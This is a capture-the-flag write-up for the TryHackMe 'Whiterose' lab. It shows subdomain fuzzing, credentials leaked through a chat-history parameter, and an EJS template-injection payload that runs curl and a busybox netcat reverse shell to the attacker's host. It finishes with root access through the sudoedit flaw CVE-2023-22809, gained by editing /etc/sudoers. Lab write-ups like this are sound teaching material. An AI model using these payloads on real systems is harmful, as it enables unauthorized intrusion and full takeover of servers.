---

Name: Whiterose
Difficulty: Easy
URL: https://tryhackme.com/room/whiterose
Description: Yet another Mr. Robot themed challenge.

---

## Enumeration

We are given credentials for **Olivia Cortez**:

```text
Olivia Cortez:olivi8
```

First, let's scan the target:

```bash
rustscan -a whiterose.thm -r 1-65535 --ulimit 5000 -- -sC -sV
```

The scan shows two interesting ports:

```text
22/tcp open  ssh
80/tcp open  http nginx 1.14.0
```

Let's check the website:

```bash
curl http://whiterose.thm
```

It redirects us to another hostname:

```html
<script>
location.href="http://cyprusbank.thm"
</script>
```

We add the hostname to `/etc/hosts`:

```text
10.112.139.50 cyprusbank.thm
```

### Directory enumeration

Running Gobuster against the main site doesn't reveal anything particularly interesting:

```bash
gobuster dir -u http://cyprusbank.thm/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -t 100
```

The only result is:

```text
/index.html
```

The page tells us that the website is currently under maintenance.

Since there isn't much to find on the main site, let's look for subdomains.

### Subdomain enumeration

We can use `ffuf` to fuzz the `Host` header:

```bash
ffuf -u http://cyprusbank.thm/ \
  -H "Host: FUZZ.cyprusbank.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 57
```

We find:

```text
www
admin
```

`www` appears to be the same maintenance page, but `admin` is interesting:

```text
http://admin.cyprusbank.thm
```

It gives us a login page.

We can log in using the credentials we were given:

```text
Olivia Cortez:olivi8
```

---

## Finding Tyrell Wellick's phone number

The admin panel contains a search function:

```text
http://admin.cyprusbank.thm/search?name=test
```

The phone numbers are censored:

```text
***-***-***
```

There is also an admin chat page.

Initially, the chat doesn't reveal much. I also tested for XSS, but the input is HTML-escaped:

```html
&lt;script&gt;alert("Hacked")&lt;/script&gt;
```

So XSS doesn't appear to be the intended route.

However, the chat URL contains an interesting parameter:

```text
/messages/?c=5
```

Changing the `c` parameter changes the number of messages displayed.

For example:

```text
/messages/?c=1000
```

This reveals older messages, including a conversation between the developers and Gayle:

```text
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so
```

We now have another set of credentials:

```text
Gayle Bev:p~]P@5!6;rs558:q
```

Logging in as Gayle gives us access to more functionality, including the full phone numbers.

---

# Getting user.txt

With Gayle's account, we can access:

```text
/settings
```

The page allows us to change a user's password.

A normal request looks like:

```http
POST /settings
Content-Type: application/x-www-form-urlencoded

name=random&password=pass
```

The application responds with:

```text
Password updated to 'pass'
```

I first tested XSS and SSTI payloads, but neither worked:

```text
<script>alert(1)</script>
{{7*7}}
${7*7}
```

### Identifying EJS

If we remove the `password` parameter entirely, the application throws an error:

```text
ReferenceError: /home/web/app/views/settings.ejs:14

password is not defined
```

The stack trace also reveals:

```text
/home/web/app/node_modules/ejs/lib/ejs.js
```

So the application is using **EJS** as its template engine.

The `settings[view options][outputFunctionName]` parameter can be abused to inject JavaScript into the EJS template compilation process.

I used the following payload:

```text
name=test&password=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://192.168.129.192:4444');s
```

On my attacking machine, I started a web server:

```bash
python3 -m http.server 4444 --bind 0.0.0.0
```

The target connected back:

```text
10.112.139.50 - - [08/Sep/2026 11:03:23] "GET / HTTP/1.1" 200 -
```

This confirms that we have **remote command execution**.

### Reverse shell

I started a Netcat listener:

```bash
nc -lvnp 4444
```

Then used:

```text
name=test&password=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.129.192 4444 -e sh');s
```

We get a shell as `web`:

```bash
id
```

```text
uid=1001(web) gid=1001(web) groups=1001(web)
```

We can now read the user flag:

```bash
cat /home/web/user.txt
```

---

# Getting root.txt

Now that we have a shell as `web`, let's check our sudo permissions:

```bash
sudo -l
```

We find:

```text
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We are allowed to run `sudoedit` on the nginx configuration as root.

Let's check the sudo version:

```bash
sudo --version
```

```text
Sudo version 1.9.12p1
```

This version is vulnerable to **CVE-2023-22809**, which allows the `sudoedit` editor environment variables to be abused to edit an additional file as root.

To make the shell easier to use, I generated a temporary SSH key on my attacking machine:

```bash
ssh-keygen -t ed25519 -f /tmp/whiterose_web -N ''
```

I then added the public key to the `web` user's `authorized_keys`:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

echo 'ssh-ed25519 AAAA... theo@test' >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```

I could now connect over SSH:

```bash
ssh -i /tmp/whiterose_web web@cyprusbank.thm
```

This gives us a much more usable shell.

### Exploiting sudoedit

We can abuse the `SUDO_EDITOR` variable:

```bash
export SUDO_EDITOR='vim -- /etc/sudoers'
```

Then:

```bash
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

This allows us to open `/etc/sudoers` with root privileges.

We add:

```text
web ALL=(ALL) NOPASSWD: ALL
```

Now check our privileges again:

```bash
sudo -l
```

We get:

```text
(ALL) NOPASSWD: ALL
```

We can now become root:

```bash
sudo su
```

Verify:

```bash
id
```

```text
uid=0(root) gid=0(root)
```

Finally:

```bash
cat /root/root.txt
```

And we have the root flag.

